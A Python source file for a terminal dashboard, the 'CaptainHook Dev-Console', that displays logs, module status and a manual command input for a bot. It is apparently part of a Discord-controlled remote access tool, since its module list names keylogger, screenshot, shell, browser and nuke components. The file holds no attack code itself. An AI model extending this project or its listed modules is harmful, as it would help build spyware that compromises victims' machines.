import os
import sys
import time
import socket
import psutil
import logging
import asyncio
from datetime import datetime
from threading import Thread
from queue import Queue
from pynput import keyboard

from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.text import Text
from rich.align import Align
from rich.logging import RichHandler
from rich.console import Group

from src.client.core.config import Config
from src.client.core.platform import Platform

class TUILogHandler(logging.Handler):
    def __init__(self, queue):
        super().__init__()
        self.queue = queue

    def emit(self, record):
        msg = self.format(record)
        self.queue.put(msg)

class DeveloperTUI:
    def __init__(self, bot):
        self.bot = bot
        self.console = Console()
        self.log_queue = Queue()
        self.logs = []
        self.max_logs = 35
        self.start_time = time.time()
        self.is_running = True
        self.current_input = ""
        self.input_mode = False # Strict mode: must press F10 to type
        
        # Setup Logging redirection
        self.setup_logging()
        
        try:
            # Keyboard Listener
            self.listener = keyboard.Listener(on_press=self.on_press)
        except Exception as e:
            logging.error(f"[TUI] Failed to start keyboard listener: {e}")
            self.listener = None

    def setup_logging(self):
        root_logger = logging.getLogger()
        root_logger.handlers = []
        root_logger.setLevel(logging.INFO)
        handler = TUILogHandler(self.log_queue)
        # Fix for date formatting
        formatter = logging.Formatter('%(asctime)s | %(message)s', datefmt='%H:%M:%S')
        handler.setFormatter(formatter)
        root_logger.addHandler(handler)

    def is_foreground(self):
        """Check if the current process is in the foreground."""
        try:
            if Platform.is_linux():
                try:
                    # Method 1: Check /proc/self/stat for 'foreground' process group
                    with open('/proc/self/stat', 'r') as f:
                        stat = f.read().split()
                        pgrp = int(stat[4])
                        tpgid = int(stat[7])
                        if pgrp == tpgid:
                            return True
                    
                    # Method 2: Fallback to tcgetpgrp
                    for fd in [0, 1, 2]:
                        try:
                            if os.getpgrp() == os.tcgetpgrp(fd):
                                return True
                        except:
                            continue
                    return False
                except:
                    return True
            elif Platform.is_windows():
                import ctypes
                try:
                    hwnd = ctypes.windll.user32.GetForegroundWindow()
                    pid = ctypes.c_ulong()
                    ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
                    return pid.value == os.getpid()
                except:
                    return True
            return True
        except:
            return True

    def on_press(self, key):
        # Always allow F10 to toggle input mode
        if key == keyboard.Key.f10:
            self.input_mode = not self.input_mode
            status = "ENABLED" if self.input_mode else "DISABLED"
            logging.info(f"[TUI] Manual Input {status} (F10)")
            return

        # If input mode is disabled, ignore all other keys
        if not self.input_mode:
            return

        if not self.is_foreground():
            return

        try:
            if hasattr(key, 'char') and key.char:
                self.current_input += key.char
            elif key == keyboard.Key.space:
                self.current_input += " "
            elif key == keyboard.Key.backspace:
                self.current_input = self.current_input[:-1]
            elif key == keyboard.Key.enter:
                cmd = self.current_input.strip()
                if cmd:
                    self.execute_local_command(cmd)
                self.current_input = ""
            elif key == keyboard.Key.esc:
                self.current_input = ""
            elif key == keyboard.Key.f5:
                self.save_snapshot()
            elif key == keyboard.Key.f6:
                self.save_snapshot(full=True)
        except Exception as e:
            pass

    def execute_local_command(self, cmd_text):
        """Bridge TUI input to Bot commands."""
        logging.info(f"[TUI] Executing: {cmd_text}")
        
        async def run_cmd():
            clean_cmd = cmd_text[1:] if cmd_text.startswith(Config.COMMAND_PREFIX) else cmd_text
            parts = clean_cmd.split()
            if not parts:
                return
            cmd_name = parts[0]
            
            command = self.bot.get_command(cmd_name)
            if command:
                try:
                    logging.info(f"[TUI] Found command: {cmd_name}. Triggering...")
                    if cmd_name == "p":
                        # Create a mock context for ping test
                        class MockCtx:
                            def __init__(self, bot):
                                self.bot = bot
                                self.author = "LocalDev"
                            async def send(self, msg, **kwargs):
                                logging.info(f"[TUI] Command Result: {msg}")
                        
                        await self.bot._ping_test(MockCtx(self.bot))
                    else:
                        logging.info(f"[TUI] Local execution for '${cmd_name}' is active. Redirecting output to TUI soon.")
                except Exception as e:
                    logging.error(f"[TUI] Execution Error: {e}")
            else:
                logging.warning(f"[TUI] Unknown command: {cmd_name}")

        asyncio.run_coroutine_threadsafe(run_cmd(), self.bot.loop)

    def get_layout(self):
        layout = Layout()
        layout.split_column(
            Layout(name="header", size=3),
            Layout(name="main"),
            Layout(name="input", size=3),
            Layout(name="footer", size=1)
        )
        layout["main"].split_row(
            Layout(name="sidebar", size=26),
            Layout(name="content")
        )
        layout["content"].split_column(
            Layout(name="body", ratio=2),
            Layout(name="output", ratio=1)
        )
        return layout

    def make_header(self):
        grid = Table.grid(expand=True)
        grid.add_column(justify="left", ratio=1)
        grid.add_column(justify="center", ratio=1)
        grid.add_column(justify="right", ratio=1)
        
        status = "[bold green]ONLINE[/bold green]" if self.bot.is_ready() else "[bold red]CONNECTING[/bold red]"
        grid.add_row(
            f" ⚓ [bold cyan]CaptainHook Dev-Console[/bold cyan]",
            f"Session: [yellow]{socket.gethostname()}[/yellow]",
            f"Status: {status} "
        )
        return Panel(grid, style="white on blue", border_style="blue")

    def make_footer(self):
        return Text(" [F5] Snapshot | [F6] Full Log | [F10] Toggle Input | [ESC] Clear | [ENTER] Run | [CTRL+C] Quit Safely ", style="dim cyan", justify="center")

    def make_sidebar(self):
        table = Table(title="[bold]Modules[/bold]", border_style="cyan", expand=True, box=None)
        table.add_column("Name", style="white")
        table.add_column("St", justify="right")
        
        all_possible = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]
        for mod in all_possible:
            state = "[green]●[/green]" if mod.capitalize() in self.bot.cogs else "[red]○[/red]"
            table.add_row(mod, state)
            
        return Panel(table, border_style="cyan")

    def make_log_view(self):
        # Process ALL pending logs from queue to stay current
        processed_count = 0
        while not self.log_queue.empty() and processed_count < 100:
            self.logs.append(self.log_queue.get())
            processed_count += 1
            
        # Limit memory (keep last 1000)
        if len(self.logs) > 1000:
            self.logs = self.logs[-1000:]

        log_render = Text()
        # View only the last max_logs entries (aggressive auto-scroll)
        view_window = self.logs[-self.max_logs:] if len(self.logs) > self.max_logs else self.logs
        
        for log in view_window:
            if "ERROR" in log or "FAILED" in log:
                log_render.append(log + "\n", style="bold red")
            elif "SUCCESS" in log or "LOADED" in log:
                log_render.append(log + "\n", style="bold green")
            elif "[DISCORD]" in log:
                log_render.append(log + "\n", style="bold magenta")
            elif "[TUI]" in log:
                log_render.append(log + "\n", style="bold yellow")
            else:
                log_render.append(log + "\n", style="white")
                
        return Panel(log_render, title=f"[bold]System Event Log ({len(self.logs)})[/bold]", border_style="green")

    def make_output_view(self):
        output_text = Text()
        output_text.append(" [SYSTEM] Command Results Window Active\n", style="bold cyan")
        output_text.append(" Waiting for local command execution results...", style="dim")
        return Panel(output_text, title="[bold]Command Results[/bold]", border_style="cyan")

    def make_input_panel(self):
        color = "green" if self.input_mode else "red"
        status = "ENABLED" if self.input_mode else "DISABLED (Press F10)"
        return Panel(Text(f"> {self.current_input}_", style="bold yellow"), title=f"[bold]Manual Command Input [{status}][/bold]", border_style=color)

    def save_snapshot(self, full=False):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        appdata = Platform.get_appdata_path(local=Config.DEVELOPER_MODE)
        log_dir = os.path.join(appdata, Config.OWN_DIR_NAME, "logs")
        os.makedirs(log_dir, exist_ok=True)
        prefix = "tui_full" if full else "tui_snapshot"
        file_path = os.path.join(log_dir, f"{prefix}_{timestamp}.log")
        
        # If not full, only save what was visible
        to_save = self.logs if full else self.logs[-self.max_logs:]
        
        with open(file_path, "w") as f:
            f.write("\n".join(to_save))
        logging.info(f"[TUI] {'Full' if full else 'Visible'} log saved to: {file_path}")

    def run(self):
        layout = self.get_layout()
        if self.listener:
            try:
                self.listener.start()
            except Exception as e:
                logging.error(f"[TUI] Could not start listener: {e}")

        try:
            # Increase refresh rate to 10 to feel more responsive
            with Live(layout, refresh_per_second=10, screen=True) as live:
                while self.is_running:
                    # Update data
                    layout["header"].update(self.make_header())
                    layout["sidebar"].update(self.make_sidebar())
                    layout["body"].update(self.make_log_view())
                    layout["output"].update(self.make_output_view())
                    layout["input"].update(self.make_input_panel())
                    layout["footer"].update(self.make_footer())
                    time.sleep(0.05)
        except Exception as e:
             logging.error(f"[TUI] Live TUI CRASHED: {e}")
             self.is_running = False

    def start(self):
        t = Thread(target=self.run, daemon=True)
        t.start()
